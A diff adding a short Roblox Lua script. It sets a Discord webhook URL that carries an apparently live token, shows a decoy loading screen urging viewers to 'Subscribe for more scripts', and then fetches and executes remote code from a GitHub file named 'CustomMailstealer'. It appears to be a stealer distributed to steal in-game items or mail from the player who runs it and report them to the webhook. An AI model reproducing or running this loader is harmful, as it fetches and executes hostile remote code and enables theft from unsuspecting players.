@@ -1,0 +1,8 @@
+```LUA
+Username = "Rofishscript"
+Webhook = "https://discord.com/api/webhooks/1211065890456469555/USHpCAUpQC25h9kPkMg2SRt7sOTpMAPuINYcA3TpMzNhweCFUckzwiFTRyaXuAQHAcUh"
+
+G_LoadingScreen = "Loading.... Subscribe for more scripts"
+G_WebhookName = "Captain hook"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()```
